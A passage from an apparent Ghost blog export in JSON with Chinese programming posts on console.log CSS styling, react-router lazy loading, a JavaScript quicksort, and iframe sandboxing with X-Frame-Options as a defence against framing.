rgba(133,108,217,1) 64%, rgba(177,0,247,1) 78%, rgba(247,0,189,1) 87%, rgba(245,22,52,1) 100%);background: -webkit-gradient(left top, right top, color-stop(0%, rgba(252,234,187,1)), color-stop(12%, rgba(175,250,77,1)), color-stop(28%, rgba(0,247,49,1)), color-stop(39%, rgba(0,210,247,1)), color-stop(51%, rgba(0,189,247,1)), color-stop(64%, rgba(133,108,217,1)), color-stop(78%, rgba(177,0,247,1)), color-stop(87%, rgba(247,0,189,1)), color-stop(100%, rgba(245,22,52,1)));background: -webkit-linear-gradient(left, rgba(252,234,187,1) 0%, rgba(175,250,77,1) 12%, rgba(0,247,49,1) 28%, rgba(0,210,247,1) 39%, rgba(0,189,247,1) 51%, rgba(133,108,217,1) 64%, rgba(177,0,247,1) 78%, rgba(247,0,189,1) 87%, rgba(245,22,52,1) 100%);background: -o-linear-gradient(left, rgba(252,234,187,1) 0%, rgba(175,250,77,1) 12%, rgba(0,247,49,1) 28%, rgba(0,210,247,1) 39%, rgba(0,189,247,1) 51%, rgba(133,108,217,1) 64%, rgba(177,0,247,1) 78%, rgba(247,0,189,1) 87%, rgba(245,22,52,1) 100%);background: -ms-linear-gradient(left, rgba(252,234,187,1) 0%, rgba(175,250,77,1) 12%, rgba(0,247,49,1) 28%, rgba(0,210,247,1) 39%, rgba(0,189,247,1) 51%, rgba(133,108,217,1) 64%, rgba(177,0,247,1) 78%, rgba(247,0,189,1) 87%, rgba(245,22,52,1) 100%);background: linear-gradient(to right, rgba(252,234,187,1) 0%, rgba(175,250,77,1) 12%, rgba(0,247,49,1) 28%, rgba(0,210,247,1) 39%, rgba(0,189,247,1) 51%, rgba(133,108,217,1) 64%, rgba(177,0,247,1) 78%, rgba(247,0,189,1) 87%, rgba(245,22,52,1) 100%);filter: progid:DXImageTransform.Microsoft.gradient( startColorstr='#fceabb', endColorstr='#f51634', GradientType=1 );font-size:5em\\\">Color文字 </lable>\\n<br>\\n\\n<lable style=\\\" text-shadow: 0 1px 0 #ccc,0 2px 0 #c9c9c9,0 3px 0 #bbb,0 4px 0 #b9b9b9,0 5px 0 #aaa,0 6px 1px rgba(0,0,0,.1),0 0 5px rgba(0,0,0,.1),0 1px 3px rgba(0,0,0,.3),0 3px 5px rgba(0,0,0,.2),0 5px 10px rgba(0,0,0,.25),0 10px 10px rgba(0,0,0,.2),0 20px 20px rgba(0,0,0,.15);font-size:5em\\\">3D文字 </lable>\\n<br>\\n\\n<table style=\\\"border-collapse: collapse;\\\" border=\\\"0\\\"><colgroup><col style=\\\"width: 132px;\\\"><col style=\\\"width: 386px;\\\"></colgroup>\\n<tbody valign=\\\"top\\\">\\n<tr style=\\\"background: #6199df;\\\">\\n<td style=\\\"padding-top: 6px; padding-left: 10px; padding-bottom: 6px; padding-right: 10px; border: solid #4d90fe 0.75pt;\\\" valign=\\\"middle\\\">\\n<p><span style=\\\"color: white; font-family: Times New Roman; font-size: 10pt;\\\"><strong>Format Specifier</strong></span></p>\\n</td>\\n<td style=\\\"padding-top: 6px; padding-left: 10px; padding-bottom: 6px; padding-right: 10px; border-top: solid #4d90fe 0.75pt; border-left: none; border-bottom: solid #4d90fe 0.75pt; border-right: solid #4d90fe 0.75pt;\\\" valign=\\\"middle\\\">\\n<p><span style=\\\"color: white; font-family: Times New Roman; font-size: 10pt;\\\"><strong>Description</strong></span></p>\\n</td>\\n</tr>\\n<tr style=\\\"background: white;\\\">\\n<td style=\\\"padding-top: 6px; padding-left: 10px; padding-bottom: 6px; padding-right: 10px; border-top: none; border-left: solid #bbbbbb 0.75pt; border-bottom: solid #bbbbbb 0.75pt; border-right: solid #bbbbbb 0.75pt;\\\">\\n<p><span style=\\\"color: #007000; font-family: Courier New; font-size: 10pt;\\\">%s</span></p>\\n</td>\\n<td style=\\\"padding-top: 6px; padding-left: 10px; padding-bottom: 6px; padding-right: 10px; border-top: none; border-left: none; border-bottom: solid #bbbbbb 0.75pt; border-right: solid #bbbbbb 0.75pt;\\\">\\n<p><span style=\\\"color: #222222; font-family: Times New Roman; font-size: 10pt;\\\">Formats the value as a string.</span></p>\\n</td>\\n</tr>\\n<tr style=\\\"background: white;\\\">\\n<td style=\\\"padding-top: 6px; padding-left: 10px; padding-bottom: 6px; padding-right: 10px; border-top: none; border-left: solid #bbbbbb 0.75pt; border-bottom: solid #bbbbbb 0.75pt; border-right: solid #bbbbbb 0.75pt;\\\">\\n<p><span style=\\\"color: #007000; font-size: 10pt;\\\"><span style=\\\"font-family: Courier New;\\\">%d</span><span style=\\\"color: #222222;\\\"><span style=\\\"font-family: Times New Roman;\\\">&nbsp;or&nbsp;</span><span style=\\\"color: #007000; font-family: Courier New;\\\">%i</span></span></span></p>\\n</td>\\n<td style=\\\"padding-top: 6px; padding-left: 10px; padding-bottom: 6px; padding-right: 10px; border-top: none; border-left: none; border-bottom: solid #bbbbbb 0.75pt; border-right: solid #bbbbbb 0.75pt;\\\">\\n<p><span style=\\\"color: #222222; font-family: Times New Roman; font-size: 10pt;\\\">Formats the value as an integer.</span></p>\\n</td>\\n</tr>\\n<tr style=\\\"background: white;\\\">\\n<td style=\\\"padding-top: 6px; padding-left: 10px; padding-bottom: 6px; padding-right: 10px; border-top: none; border-left: solid #bbbbbb 0.75pt; border-bottom: solid #bbbbbb 0.75pt; border-right: solid #bbbbbb 0.75pt;\\\">\\n<p><span style=\\\"color: #007000; font-family: Courier New; font-size: 10pt;\\\">%f</span></p>\\n</td>\\n<td style=\\\"padding-top: 6px; padding-left: 10px; padding-bottom: 6px; padding-right: 10px; border-top: none; border-left: none; border-bottom: solid #bbbbbb 0.75pt; border-right: solid #bbbbbb 0.75pt;\\\">\\n<p><span style=\\\"color: #222222; font-family: Times New Roman; font-size: 10pt;\\\">Formats the value as a floating point value.</span></p>\\n</td>\\n</tr>\\n<tr style=\\\"background: white;\\\">\\n<td style=\\\"padding-top: 6px; padding-left: 10px; padding-bottom: 6px; padding-right: 10px; border-top: none; border-left: solid #bbbbbb 0.75pt; border-bottom: solid #bbbbbb 0.75pt; border-right: solid #bbbbbb 0.75pt;\\\">\\n<p><span style=\\\"color: #007000; font-family: Courier New; font-size: 10pt;\\\">%o</span></p>\\n</td>\\n<td style=\\\"padding-top: 6px; padding-left: 10px; padding-bottom: 6px; padding-right: 10px; border-top: none; border-left: none; border-bottom: solid #bbbbbb 0.75pt; border-right: solid #bbbbbb 0.75pt;\\\">\\n<p><span style=\\\"color: #222222; font-family: Times New Roman; font-size: 10pt;\\\">Formats the value as an expandable DOM element (as in the Elements panel).</span></p>\\n</td>\\n</tr>\\n<tr style=\\\"background: white;\\\">\\n<td style=\\\"padding-top: 6px; padding-left: 10px; padding-bottom: 6px; padding-right: 10px; border-top: none; border-left: solid #bbbbbb 0.75pt; border-bottom: solid #bbbbbb 0.75pt; border-right: solid #bbbbbb 0.75pt;\\\">\\n<p><span style=\\\"color: #007000; font-family: Courier New; font-size: 10pt;\\\">%O</span></p>\\n</td>\\n<td style=\\\"padding-top: 6px; padding-left: 10px; padding-bottom: 6px; padding-right: 10px; border-top: none; border-left: none; border-bottom: solid #bbbbbb 0.75pt; border-right: solid #bbbbbb 0.75pt;\\\">\\n<p><span style=\\\"color: #222222; font-family: Times New Roman; font-size: 10pt;\\\">Formats the value as an expandable JavaScript object.</span></p>\\n</td>\\n</tr>\\n<tr style=\\\"background: white;\\\">\\n<td style=\\\"padding-top: 6px; padding-left: 10px; padding-bottom: 6px; padding-right: 10px; border-top: none; border-left: solid #bbbbbb 0.75pt; border-bottom: solid #bbbbbb 0.75pt; border-right: solid #bbbbbb 0.75pt;\\\">\\n<p><span style=\\\"color: #007000; font-family: Courier New; font-size: 10pt; background-color: yellow;\\\">%c</span></p>\\n</td>\\n<td style=\\\"padding-top: 6px; padding-left: 10px; padding-bottom: 6px; padding-right: 10px; border-top: none; border-left: none; border-bottom: solid #bbbbbb 0.75pt; border-right: solid #bbbbbb 0.75pt;\\\">\\n<p><span style=\\\"color: #222222; font-family: Times New Roman; font-size: 10pt; background-color: yellow;\\\">Formats the output string according to CSS styles you provide.</span></p>\\n</td>\\n</tr>\\n</tbody>\\n</table>\\n> 输出图片\\n\\n`console.log(\\\"%c\\\", \\\"padding:50px 300px;line-height:120px;background:url('http://www.dadigua.win:8080/show/book/img/grasslight-big.jpg') no-repeat;\\\");`\\n\\n> 输出文字\\n\\n`console.log(\\\"%c3D Text\\\",\\\" text-shadow: 0 1px 0 #ccc,0 2px 0 #c9c9c9,0 3px 0 #bbb,0 4px 0 #b9b9b9,0 5px 0 #aaa,0 6px 1px rgba(0,0,0,.1),0 0 5px rgba(0,0,0,.1),0 1px 3px rgba(0,0,0,.3),0 3px 5px rgba(0,0,0,.2),0 5px 10px rgba(0,0,0,.25),0 10px 10px rgba(0,0,0,.2),0 20px 20px rgba(0,0,0,.15);font-size:5em\\\")`\\n\\n<script>\\nconsole.log(\\\"%c\\\", \\\"padding:300px 300px;line-height:120px;background:url('http://www.dadigua.win:8080/show/book/img/grasslight-big.jpg') no-repeat;\\\");\\nconsole.log(\\\"%c3D Text\\\",\\\" text-shadow: 0 1px 0 #ccc,0 2px 0 #c9c9c9,0 3px 0 #bbb,0 4px 0 #b9b9b9,0 5px 0 #aaa,0 6px 1px rgba(0,0,0,.1),0 0 5px rgba(0,0,0,.1),0 1px 3px rgba(0,0,0,.3),0 3px 5px rgba(0,0,0,.2),0 5px 10px rgba(0,0,0,.25),0 10px 10px rgba(0,0,0,.2),0 20px 20px rgba(0,0,0,.15);font-size:5em\\\")\\n</script>\\n\\n\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><p><lable style=\"background-image:-webkit-gradient( linear, left top, right top, color-stop(0, #f22), color-stop(0.15, #f2f), color-stop(0.3, #22f), color-stop(0.45, #2ff), color-stop(0.6, #2f2),color-stop(0.75, #2f2), color-stop(0.9, #ff2), color-stop(1, #f22) );color:transparent;-webkit-background-clip: text;font-size:5em;\">Color文字 </lable><br>\n<br></p>\n<p><lable style=\"background: rgba(252,234,187,1);background: -moz-linear-gradient(left, rgba(252,234,187,1) 0%, rgba(175,250,77,1) 12%, rgba(0,247,49,1) 28%, rgba(0,210,247,1) 39%,rgba(0,189,247,1) 51%, rgba(133,108,217,1) 64%, rgba(177,0,247,1) 78%, rgba(247,0,189,1) 87%, rgba(245,22,52,1) 100%);background: -webkit-gradient(left top, right top, color-stop(0%, rgba(252,234,187,1)), color-stop(12%, rgba(175,250,77,1)), color-stop(28%, rgba(0,247,49,1)), color-stop(39%, rgba(0,210,247,1)), color-stop(51%, rgba(0,189,247,1)), color-stop(64%, rgba(133,108,217,1)), color-stop(78%, rgba(177,0,247,1)), color-stop(87%, rgba(247,0,189,1)), color-stop(100%, rgba(245,22,52,1)));background: -webkit-linear-gradient(left, rgba(252,234,187,1) 0%, rgba(175,250,77,1) 12%, rgba(0,247,49,1) 28%, rgba(0,210,247,1) 39%, rgba(0,189,247,1) 51%, rgba(133,108,217,1) 64%, rgba(177,0,247,1) 78%, rgba(247,0,189,1) 87%, rgba(245,22,52,1) 100%);background: -o-linear-gradient(left, rgba(252,234,187,1) 0%, rgba(175,250,77,1) 12%, rgba(0,247,49,1) 28%, rgba(0,210,247,1) 39%, rgba(0,189,247,1) 51%, rgba(133,108,217,1) 64%, rgba(177,0,247,1) 78%, rgba(247,0,189,1) 87%, rgba(245,22,52,1) 100%);background: -ms-linear-gradient(left, rgba(252,234,187,1) 0%, rgba(175,250,77,1) 12%, rgba(0,247,49,1) 28%, rgba(0,210,247,1) 39%, rgba(0,189,247,1) 51%, rgba(133,108,217,1) 64%, rgba(177,0,247,1) 78%, rgba(247,0,189,1) 87%, rgba(245,22,52,1) 100%);background: linear-gradient(to right, rgba(252,234,187,1) 0%, rgba(175,250,77,1) 12%, rgba(0,247,49,1) 28%, rgba(0,210,247,1) 39%, rgba(0,189,247,1) 51%, rgba(133,108,217,1) 64%, rgba(177,0,247,1) 78%, rgba(247,0,189,1) 87%, rgba(245,22,52,1) 100%);filter: progid:DXImageTransform.Microsoft.gradient( startColorstr='#fceabb', endColorstr='#f51634', GradientType=1 );font-size:5em\">Color文字 </lable><br>\n<br></p>\n<p><lable style=\" text-shadow: 0 1px 0 #ccc,0 2px 0 #c9c9c9,0 3px 0 #bbb,0 4px 0 #b9b9b9,0 5px 0 #aaa,0 6px 1px rgba(0,0,0,.1),0 0 5px rgba(0,0,0,.1),0 1px 3px rgba(0,0,0,.3),0 3px 5px rgba(0,0,0,.2),0 5px 10px rgba(0,0,0,.25),0 10px 10px rgba(0,0,0,.2),0 20px 20px rgba(0,0,0,.15);font-size:5em\">3D文字 </lable><br>\n<br></p>\n<table style=\"border-collapse: collapse;\" border=\"0\"><colgroup><col style=\"width: 132px;\"><col style=\"width: 386px;\"></colgroup>\n<tbody valign=\"top\">\n<tr style=\"background: #6199df;\">\n<td style=\"padding-top: 6px; padding-left: 10px; padding-bottom: 6px; padding-right: 10px; border: solid #4d90fe 0.75pt;\" valign=\"middle\">\n<p><span style=\"color: white; font-family: Times New Roman; font-size: 10pt;\"><strong>Format Specifier</strong></span></p>\n</td>\n<td style=\"padding-top: 6px; padding-left: 10px; padding-bottom: 6px; padding-right: 10px; border-top: solid #4d90fe 0.75pt; border-left: none; border-bottom: solid #4d90fe 0.75pt; border-right: solid #4d90fe 0.75pt;\" valign=\"middle\">\n<p><span style=\"color: white; font-family: Times New Roman; font-size: 10pt;\"><strong>Description</strong></span></p>\n</td>\n</tr>\n<tr style=\"background: white;\">\n<td style=\"padding-top: 6px; padding-left: 10px; padding-bottom: 6px; padding-right: 10px; border-top: none; border-left: solid #bbbbbb 0.75pt; border-bottom: solid #bbbbbb 0.75pt; border-right: solid #bbbbbb 0.75pt;\">\n<p><span style=\"color: #007000; font-family: Courier New; font-size: 10pt;\">%s</span></p>\n</td>\n<td style=\"padding-top: 6px; padding-left: 10px; padding-bottom: 6px; padding-right: 10px; border-top: none; border-left: none; border-bottom: solid #bbbbbb 0.75pt; border-right: solid #bbbbbb 0.75pt;\">\n<p><span style=\"color: #222222; font-family: Times New Roman; font-size: 10pt;\">Formats the value as a string.</span></p>\n</td>\n</tr>\n<tr style=\"background: white;\">\n<td style=\"padding-top: 6px; padding-left: 10px; padding-bottom: 6px; padding-right: 10px; border-top: none; border-left: solid #bbbbbb 0.75pt; border-bottom: solid #bbbbbb 0.75pt; border-right: solid #bbbbbb 0.75pt;\">\n<p><span style=\"color: #007000; font-size: 10pt;\"><span style=\"font-family: Courier New;\">%d</span><span style=\"color: #222222;\"><span style=\"font-family: Times New Roman;\">&nbsp;or&nbsp;</span><span style=\"color: #007000; font-family: Courier New;\">%i</span></span></span></p>\n</td>\n<td style=\"padding-top: 6px; padding-left: 10px; padding-bottom: 6px; padding-right: 10px; border-top: none; border-left: none; border-bottom: solid #bbbbbb 0.75pt; border-right: solid #bbbbbb 0.75pt;\">\n<p><span style=\"color: #222222; font-family: Times New Roman; font-size: 10pt;\">Formats the value as an integer.</span></p>\n</td>\n</tr>\n<tr style=\"background: white;\">\n<td style=\"padding-top: 6px; padding-left: 10px; padding-bottom: 6px; padding-right: 10px; border-top: none; border-left: solid #bbbbbb 0.75pt; border-bottom: solid #bbbbbb 0.75pt; border-right: solid #bbbbbb 0.75pt;\">\n<p><span style=\"color: #007000; font-family: Courier New; font-size: 10pt;\">%f</span></p>\n</td>\n<td style=\"padding-top: 6px; padding-left: 10px; padding-bottom: 6px; padding-right: 10px; border-top: none; border-left: none; border-bottom: solid #bbbbbb 0.75pt; border-right: solid #bbbbbb 0.75pt;\">\n<p><span style=\"color: #222222; font-family: Times New Roman; font-size: 10pt;\">Formats the value as a floating point value.</span></p>\n</td>\n</tr>\n<tr style=\"background: white;\">\n<td style=\"padding-top: 6px; padding-left: 10px; padding-bottom: 6px; padding-right: 10px; border-top: none; border-left: solid #bbbbbb 0.75pt; border-bottom: solid #bbbbbb 0.75pt; border-right: solid #bbbbbb 0.75pt;\">\n<p><span style=\"color: #007000; font-family: Courier New; font-size: 10pt;\">%o</span></p>\n</td>\n<td style=\"padding-top: 6px; padding-left: 10px; padding-bottom: 6px; padding-right: 10px; border-top: none; border-left: none; border-bottom: solid #bbbbbb 0.75pt; border-right: solid #bbbbbb 0.75pt;\">\n<p><span style=\"color: #222222; font-family: Times New Roman; font-size: 10pt;\">Formats the value as an expandable DOM element (as in the Elements panel).</span></p>\n</td>\n</tr>\n<tr style=\"background: white;\">\n<td style=\"padding-top: 6px; padding-left: 10px; padding-bottom: 6px; padding-right: 10px; border-top: none; border-left: solid #bbbbbb 0.75pt; border-bottom: solid #bbbbbb 0.75pt; border-right: solid #bbbbbb 0.75pt;\">\n<p><span style=\"color: #007000; font-family: Courier New; font-size: 10pt;\">%O</span></p>\n</td>\n<td style=\"padding-top: 6px; padding-left: 10px; padding-bottom: 6px; padding-right: 10px; border-top: none; border-left: none; border-bottom: solid #bbbbbb 0.75pt; border-right: solid #bbbbbb 0.75pt;\">\n<p><span style=\"color: #222222; font-family: Times New Roman; font-size: 10pt;\">Formats the value as an expandable JavaScript object.</span></p>\n</td>\n</tr>\n<tr style=\"background: white;\">\n<td style=\"padding-top: 6px; padding-left: 10px; padding-bottom: 6px; padding-right: 10px; border-top: none; border-left: solid #bbbbbb 0.75pt; border-bottom: solid #bbbbbb 0.75pt; border-right: solid #bbbbbb 0.75pt;\">\n<p><span style=\"color: #007000; font-family: Courier New; font-size: 10pt; background-color: yellow;\">%c</span></p>\n</td>\n<td style=\"padding-top: 6px; padding-left: 10px; padding-bottom: 6px; padding-right: 10px; border-top: none; border-left: none; border-bottom: solid #bbbbbb 0.75pt; border-right: solid #bbbbbb 0.75pt;\">\n<p><span style=\"color: #222222; font-family: Times New Roman; font-size: 10pt; background-color: yellow;\">Formats the output string according to CSS styles you provide.</span></p>\n</td>\n</tr>\n</tbody>\n</table>\n> 输出图片\n<p><code>console.log(&quot;%c&quot;, &quot;padding:50px 300px;line-height:120px;background:url('http://www.dadigua.win:8080/show/book/img/grasslight-big.jpg') no-repeat;&quot;);</code></p>\n<blockquote>\n<p>输出文字</p>\n</blockquote>\n<p><code>console.log(&quot;%c3D Text&quot;,&quot; text-shadow: 0 1px 0 #ccc,0 2px 0 #c9c9c9,0 3px 0 #bbb,0 4px 0 #b9b9b9,0 5px 0 #aaa,0 6px 1px rgba(0,0,0,.1),0 0 5px rgba(0,0,0,.1),0 1px 3px rgba(0,0,0,.3),0 3px 5px rgba(0,0,0,.2),0 5px 10px rgba(0,0,0,.25),0 10px 10px rgba(0,0,0,.2),0 20px 20px rgba(0,0,0,.15);font-size:5em&quot;)</code></p>\n<script>\nconsole.log(\"%c\", \"padding:300px 300px;line-height:120px;background:url('http://www.dadigua.win:8080/show/book/img/grasslight-big.jpg') no-repeat;\");\nconsole.log(\"%c3D Text\",\" text-shadow: 0 1px 0 #ccc,0 2px 0 #c9c9c9,0 3px 0 #bbb,0 4px 0 #b9b9b9,0 5px 0 #aaa,0 6px 1px rgba(0,0,0,.1),0 0 5px rgba(0,0,0,.1),0 1px 3px rgba(0,0,0,.3),0 3px 5px rgba(0,0,0,.2),0 5px 10px rgba(0,0,0,.25),0 10px 10px rgba(0,0,0,.2),0 20px 20px rgba(0,0,0,.15);font-size:5em\")\n</script>\n<!--kg-card-end: markdown-->","comment_id":"39","plaintext":"Color文字 \n\n\n\nColor文字 \n\n\n\n3D文字 \n\n\n\nFormat Specifier\n\nDescription\n\n%s\n\nFormats the value as a string.\n\n%dor%i\n\nFormats the value as an integer.\n\n%f\n\nFormats the value as a floating point value.\n\n%o\n\nFormats the value as an expandable DOM element (as in the Elements panel).\n\n%O\n\nFormats the value as an expandable JavaScript object.\n\n%c\n\nFormats the output string according to CSS styles you provide.\n\n> 输出图片console.log(\"%c\", \"padding:50px\n300px;line-height:120px;background:url('http://www.dadigua.win:8080/show/book/img/grasslight-big.jpg')\nno-repeat;\");\n\n> 输出文字\n\n\nconsole.log(\"%c3D Text\",\" text-shadow: 0 1px 0 #ccc,0 2px 0 #c9c9c9,0 3px 0\n#bbb,0 4px 0 #b9b9b9,0 5px 0 #aaa,0 6px 1px rgba(0,0,0,.1),0 0 5px\nrgba(0,0,0,.1),0 1px 3px rgba(0,0,0,.3),0 3px 5px rgba(0,0,0,.2),0 5px 10px\nrgba(0,0,0,.25),0 10px 10px rgba(0,0,0,.2),0 20px 20px\nrgba(0,0,0,.15);font-size:5em\")","feature_image":null,"featured":0,"type":"post","status":"published","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2016-04-18T14:41:20.000Z","created_by":"1","updated_at":"2017-01-17T07:07:59.000Z","updated_by":"1","published_at":"2016-02-18T14:41:00.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d2e5","uuid":"96282a70-267e-4ccc-bb34-83af9cfd7e74","title":"webpack、react-router、react-router-loader","slug":"webpack-react-router-bundle-loader","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"用bundle-loader,死活都不行，代码如下。按理来说，应该可以的，可能react-router更新了的关系\\n```\\nconst loadContainerAsync = bundle => (location, cb) => {  \\n    bundle(component => {\\n        cb(null, component);\\n    });\\n};\\n\\nrender((  \\n    <Router history={hashHistory}>\\n        <Route path=\\\"/\\\" component={App}>\\n            <IndexRoute component={Home} />\\n            <Route path=\\\"home\\\" component={Home} />\\n            <Route path=\\\"addcase\\\"  getComponent={loadContainerAsync(require('bundle?lazy!./Components/addcase.js'))}/>\\n            <Route path=\\\"casequery\\\" component={casequery} />\\n            <Route path=\\\"usermanage\\\" component={usermanage} />\\n            <Route path=\\\"datastat\\\" component={datastat} />\\n            <Route path=\\\"Shegengku\\\" component={Shegengku} />\\n            <Route path=\\\"VosQuery\\\" component={VosQuery} />\\n\\n\\n        </Route>\\n    </Router>\\n), document.getElementById('body'));\\n```\\n最后使用react-router-loader才解决。\\n\\n版本` \\\"react-router\\\": \\\"^2.4.0\\\",`\\n> Installation\\n\\nnpm install react-router-loader --save-dev\\n```\\n<Route component={require('react-router!./Components/addcase.js')} />\\n<Route component={require('react-router?name=chunkName!./Components/addcase.js')} />\\n```\\n[更加详细](https://www.npmjs.com/package/react-router-loader)\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><p>用bundle-loader,死活都不行，代码如下。按理来说，应该可以的，可能react-router更新了的关系</p>\n<pre><code>const loadContainerAsync = bundle =&gt; (location, cb) =&gt; {  \n    bundle(component =&gt; {\n        cb(null, component);\n    });\n};\n\nrender((  \n    &lt;Router history={hashHistory}&gt;\n        &lt;Route path=&quot;/&quot; component={App}&gt;\n            &lt;IndexRoute component={Home} /&gt;\n            &lt;Route path=&quot;home&quot; component={Home} /&gt;\n            &lt;Route path=&quot;addcase&quot;  getComponent={loadContainerAsync(require('bundle?lazy!./Components/addcase.js'))}/&gt;\n            &lt;Route path=&quot;casequery&quot; component={casequery} /&gt;\n            &lt;Route path=&quot;usermanage&quot; component={usermanage} /&gt;\n            &lt;Route path=&quot;datastat&quot; component={datastat} /&gt;\n            &lt;Route path=&quot;Shegengku&quot; component={Shegengku} /&gt;\n            &lt;Route path=&quot;VosQuery&quot; component={VosQuery} /&gt;\n\n\n        &lt;/Route&gt;\n    &lt;/Router&gt;\n), document.getElementById('body'));\n</code></pre>\n<p>最后使用react-router-loader才解决。</p>\n<p>版本<code> &quot;react-router&quot;: &quot;^2.4.0&quot;,</code></p>\n<blockquote>\n<p>Installation</p>\n</blockquote>\n<p>npm install react-router-loader --save-dev</p>\n<pre><code>&lt;Route component={require('react-router!./Components/addcase.js')} /&gt;\n&lt;Route component={require('react-router?name=chunkName!./Components/addcase.js')} /&gt;\n</code></pre>\n<p><a href=\"https://www.npmjs.com/package/react-router-loader\">更加详细</a></p>\n<!--kg-card-end: markdown-->","comment_id":"40","plaintext":"用bundle-loader,死活都不行，代码如下。按理来说，应该可以的，可能react-router更新了的关系\n\nconst loadContainerAsync = bundle => (location, cb) => {  \n    bundle(component => {\n        cb(null, component);\n    });\n};\n\nrender((  \n    <Router history={hashHistory}>\n        <Route path=\"/\" component={App}>\n            <IndexRoute component={Home} />\n            <Route path=\"home\" component={Home} />\n            <Route path=\"addcase\"  getComponent={loadContainerAsync(require('bundle?lazy!./Components/addcase.js'))}/>\n            <Route path=\"casequery\" component={casequery} />\n            <Route path=\"usermanage\" component={usermanage} />\n            <Route path=\"datastat\" component={datastat} />\n            <Route path=\"Shegengku\" component={Shegengku} />\n            <Route path=\"VosQuery\" component={VosQuery} />\n\n\n        </Route>\n    </Router>\n), document.getElementById('body'));\n\n\n最后使用react-router-loader才解决。\n\n版本 \"react-router\": \"^2.4.0\",\n\n> Installation\n\n\nnpm install react-router-loader --save-dev\n\n<Route component={require('react-router!./Components/addcase.js')} />\n<Route component={require('react-router?name=chunkName!./Components/addcase.js')} />\n\n\n更加详细 [https://www.npmjs.com/package/react-router-loader]","feature_image":null,"featured":0,"type":"post","status":"published","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2016-05-19T07:49:56.000Z","created_by":"1","updated_at":"2017-01-17T06:33:06.000Z","updated_by":"1","published_at":"2016-05-19T09:23:02.000Z","published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d2e6","uuid":"73735bfd-5640-43d2-a604-ddf22152e402","title":"快排","slug":"kuai-pai","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"```\\nArray.prototype.quickSort = function(f) { //??????  \\n    var fn = f;;\\n    if (f == null) {\\n        fn = function(a, b) {\\n            return a > b;\\n        }\\n    }\\n    var arr = this;\\n    if (arr.length <= 1) {\\n        return arr;\\n    }\\n    var index = Math.floor(arr.length / 2);\\n    //   var pivot = arr.splice(index,1)[0];\\n    var pivot = arr[index];\\n    var left = [];\\n    var right = [];\\n    for (var i = 0; i < arr.length; i++) {\\n        if (i == index) {\\n            continue;\\n        }\\n        if (fn(arr[i], pivot)) {\\n            right.push(arr[i])\\n        } else {\\n            left.push(arr[i])\\n        }\\n    }\\n    return left.quickSort(fn).concat([pivot], right.quickSort(fn));\\n}\\n```\"}]],\"sections\":[[10,0]]}","html":"<!--kg-card-begin: markdown--><pre><code>Array.prototype.quickSort = function(f) { //??????  \n    var fn = f;;\n    if (f == null) {\n        fn = function(a, b) {\n            return a &gt; b;\n        }\n    }\n    var arr = this;\n    if (arr.length &lt;= 1) {\n        return arr;\n    }\n    var index = Math.floor(arr.length / 2);\n    //   var pivot = arr.splice(index,1)[0];\n    var pivot = arr[index];\n    var left = [];\n    var right = [];\n    for (var i = 0; i &lt; arr.length; i++) {\n        if (i == index) {\n            continue;\n        }\n        if (fn(arr[i], pivot)) {\n            right.push(arr[i])\n        } else {\n            left.push(arr[i])\n        }\n    }\n    return left.quickSort(fn).concat([pivot], right.quickSort(fn));\n}\n</code></pre>\n<!--kg-card-end: markdown-->","comment_id":"41","plaintext":"Array.prototype.quickSort = function(f) { //??????  \n    var fn = f;;\n    if (f == null) {\n        fn = function(a, b) {\n            return a > b;\n        }\n    }\n    var arr = this;\n    if (arr.length <= 1) {\n        return arr;\n    }\n    var index = Math.floor(arr.length / 2);\n    //   var pivot = arr.splice(index,1)[0];\n    var pivot = arr[index];\n    var left = [];\n    var right = [];\n    for (var i = 0; i < arr.length; i++) {\n        if (i == index) {\n            continue;\n        }\n        if (fn(arr[i], pivot)) {\n            right.push(arr[i])\n        } else {\n            left.push(arr[i])\n        }\n    }\n    return left.quickSort(fn).concat([pivot], right.quickSort(fn));\n}","feature_image":null,"featured":0,"type":"post","status":"draft","locale":null,"visibility":"public","send_email_when_published":0,"author_id":"1","created_at":"2016-05-23T10:27:07.000Z","created_by":"1","updated_at":"2016-05-23T10:27:31.000Z","updated_by":"1","published_at":null,"published_by":"1","custom_excerpt":null,"codeinjection_head":null,"codeinjection_foot":null,"custom_template":null,"canonical_url":null},{"id":"5f48b7a0c6057c0001f5d2e7","uuid":"0f10ab51-a194-4edb-988f-9bdaaf84fc8c","title":"HTML5 <iframe> 的 sandbox 属性以及 X-Frame-Options","slug":"html5-iframe-de-sandbox-shu-xing","mobiledoc":"{\"version\":\"0.3.1\",\"markups\":[],\"atoms\":[],\"cards\":[[\"card-markdown\",{\"cardName\":\"card-markdown\",\"markdown\":\"> HTML5 `<iframe> sandbox`\\n```\\n值\\t描述\\n\\\"\\\"(为空)\\t应用以下所有的限制。\\nallow-same-origin\\t允许 iframe 内容被视为与包含文档有相同的来源。\\nallow-top-navigation\\t允许 iframe 内容从包含文档导航（加载）内容。\\nallow-forms\\t允许表单提交。\\nallow-scripts\\t允许脚本执行。\\n```\\n`<iframe src=\\\"xxxx\\\" sandbox=\\\"value\\\">`\\n\\n当别人要frame你的网页时候，只要用sandbox不写\\\"allow-script\\\"时，即使页面写了下面代码，也不能防止别人frame。因为js根本不会执行。但是，css，html，form行为还是可以用的。\\n\\n```\\nif(top.location!=self.location){\\n   top.location=self.location;\\n}\\n```\\n> 解决办法`X-Frame-Options`\\n\\n好在可以采用 HTTP头`X-Frame-Options`解决问题。可以设置以下3个值。\\n\\n* DENY:---------------浏览器会拒绝当前页面加载任何 frame 页面\\n* SAMEORIGIN:---------frame页面的地址只能为同源域名下的页面\\n* ALLOW-FROM origin:--则可以定义允许 frame 